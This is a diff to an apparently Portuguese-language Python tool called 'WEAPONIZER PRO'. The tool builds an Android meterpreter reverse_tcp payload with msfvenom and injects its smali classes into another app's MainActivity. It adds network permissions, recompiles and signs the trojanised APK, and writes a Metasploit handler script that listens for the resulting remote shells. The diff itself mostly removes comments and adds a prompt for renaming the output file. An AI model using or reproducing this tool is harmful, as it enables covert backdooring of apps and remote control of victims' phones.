@@ -23,13 +23,12 @@ def exibir_banner():
 {RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
 {RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
 {RESET}
- {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Build + Sign + Listen (Red Edition){RESET}
+ {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Direct Injection & Build Engine{RESET}
  {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
     """.strip()
     print(banner)
 
 def fix_permissions(project_folder):
-    """Injeta permissões de rede no AndroidManifest.xml."""
     manifest = os.path.join(project_folder, "AndroidManifest.xml")
     if not os.path.exists(manifest): return
     with open(manifest, "r") as f: content = f.read()
@@ -41,7 +40,6 @@ def fix_permissions(project_folder):
         log("Permissões injetadas no Manifesto.", "success")
 
 def iniciar_listener(ip, porta):
-    """Cria script RC e dispara o Handler."""
     rc_content = f"use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {ip}\nset LPORT {porta}\nset EXITONSESSION false\nexploit -j"
     with open("handler.rc", "w") as f: f.write(rc_content)
     log("Iniciando msfconsole...", "warn")
@@ -56,13 +54,11 @@ def gerar_e_injetar_payload(project_folder):
     subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "p.apk"], capture_output=True)
     subprocess.run(["apktool", "d", "p.apk", "-o", "p_tmp", "-f"], capture_output=True)
     
-    # Migração das classes do Metasploit
     src = os.path.join("p_tmp", "smali", "com", "metasploit")
     dst = os.path.join(project_folder, "smali", "com", "metasploit")
     if os.path.exists(dst): rmtree(dst)
     copytree(src, dst)
 
-    # Identificar MainActivity
     with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
         m = f.read()
         main_activity = re.search(r'<activity [^>]*android:name="([^"]+)"', m).group(1)
@@ -70,10 +66,8 @@ def gerar_e_injetar_payload(project_folder):
             pkg = re.search(r'package="([^"]+)"', m).group(1)
             main_activity = pkg + main_activity
 
-    # BUSCA CORRIGIDA DO ARQUIVO SMALI
     rel_path = main_activity.replace('.', '/') + ".smali"
     smali_path = None
-    # Procura em smali, smali_classes2, smali_classes3...
     for i in range(1, 15):
         folder = "smali" if i == 1 else f"smali_classes{i}"
         test_path = os.path.join(project_folder, folder, rel_path)
@@ -84,7 +78,6 @@ def gerar_e_injetar_payload(project_folder):
     if smali_path:
         log(f"Injetando em: {os.path.basename(smali_path)}", "success")
         with open(smali_path, "r") as f: lines = f.readlines()
-        
         new_lines, injected, in_oncreate = [], False, False
         for line in lines:
             new_lines.append(line)
@@ -100,21 +93,33 @@ def gerar_e_injetar_payload(project_folder):
         if os.path.exists("p.apk"): os.remove("p.apk")
         return True, lhost, lport
     
-    log("Erro: Não foi possível localizar o arquivo Smali da MainActivity.", "error")
+    log("Erro ao localizar MainActivity.", "error")
     return False, None, None
 
 def build_e_assinar(out):
-    final = os.path.abspath(f"{out}_weaponized.apk")
-    log(f"Recompilando '{out}'...", "info")
+    # Opção de renomear o arquivo
+    default_name = f"{out}_weaponized.apk"
+    print(f"\n {YELLOW}»{RESET} Nome do arquivo final (Padrão: {default_name}):")
+    custom_name = input(f" {RED}# {RESET}").strip()
+    
+    if not custom_name:
+        final_filename = default_name
+    else:
+        final_filename = custom_name if custom_name.endswith(".apk") else f"{custom_name}.apk"
+
+    final_path = os.path.abspath(final_filename)
+    
+    log(f"Recompilando projeto '{out}'...", "info")
     subprocess.run(["apktool", "b", out, "-o", "t.apk"], capture_output=True)
     
     if not os.path.exists("debug.keystore"):
-        subprocess.run(["keytool", "-genkey", "-v", "-keystore", "debug.keystore", "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=W"], capture_output=True)
+        subprocess.run(["keytool", "-genkey", "-v", "-keystore", "debug.keystore", "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)
     
-    log("Assinando APK...", "info")
-    subprocess.run(["apksigner", "sign", "--ks", "debug.keystore", "--ks-pass", "pass:android", "--out", final, "t.apk"])
+    log("Assinando APK final...", "info")
+    subprocess.run(["apksigner", "sign", "--ks", "debug.keystore", "--ks-pass", "pass:android", "--out", final_path, "t.apk"])
     if os.path.exists("t.apk"): os.remove("t.apk")
-    print(f"\n{GREEN}[+] SUCESSO! APK Gerado:{RESET} {BOLD}{final}{RESET}")
+    
+    print(f"\n{GREEN}[+] ARTEFATO GERADO:{RESET} {BOLD}{final_path}{RESET}")
     return True
 
 def main():
